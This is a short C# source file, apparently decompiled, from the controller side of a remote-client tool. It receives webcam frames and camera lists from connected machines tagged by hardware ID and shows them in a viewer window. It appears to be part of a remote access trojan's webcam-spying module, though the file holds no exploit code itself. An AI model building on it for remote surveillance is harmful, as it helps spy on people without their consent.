using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerCamera
{
	public static void Read(Clients client, object[] objects)
	{
		string text = (string)objects[1];
		if (!(text == "Connect"))
		{
			if (!(text == "Image"))
			{
				return;
			}
			FormCamera form = (FormCamera)client.Tag;
			if (form == null)
			{
				client.Disconnect();
				return;
			}
			Bitmap bitmap = Methods.ByteArrayToBitmap((byte[])objects[2]);
			form.FPS++;
			if (form.sw.ElapsedMilliseconds >= 1000)
			{
				form.Text = $"Camera [{client.Hwid}]  Fps[{form.FPS}] Data[{Methods.BytesToString(((byte[])objects[2]).Length)}] Size[{bitmap.Width}x{bitmap.Height}]";
				form.FPS = 0;
				form.sw = Stopwatch.StartNew();
			}
			form.pictureBox1.Invoke((MethodInvoker)delegate
			{
				form.pictureBox1.Image = bitmap;
			});
			return;
		}
		FormCamera form2 = (FormCamera)Application.OpenForms["Camera:" + (string)objects[2]];
		if (form2 == null)
		{
			client.Disconnect();
			return;
		}
		form2.Invoke((MethodInvoker)delegate
		{
			form2.client = client;
			form2.Text = "Camera [" + (string)objects[2] + "]";
			string[] array = ((string)objects[3]).Split(',');
			foreach (string item in array)
			{
				form2.rjComboBox1.Items.Add(item);
			}
			form2.rjComboBox1.SelectedIndex = 0;
			form2.materialSwitch1.Enabled = true;
			form2.rjComboBox1.Enabled = true;
			form2.numericUpDown2.Enabled = true;
		});
		client.Tag = form2;
		client.Hwid = (string)objects[2];
	}
}
